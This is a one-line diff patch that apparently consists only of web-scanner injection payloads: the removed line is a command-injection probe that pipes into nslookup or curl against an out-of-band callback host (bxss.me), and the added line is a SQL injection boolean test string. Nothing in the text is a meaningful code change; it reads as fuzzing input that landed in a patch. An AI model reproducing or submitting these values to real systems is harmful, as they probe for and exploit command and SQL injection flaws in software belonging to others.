@@ -1,1 +1,1 @@
-|(nslookup -q=cname hitmbrxxetwtr06adc.bxss.me||curl hitmbrxxetwtr06adc.bxss.me)
+-1' OR 2+903-903-1=0+0+0+1 or 'krunxUbZ'='
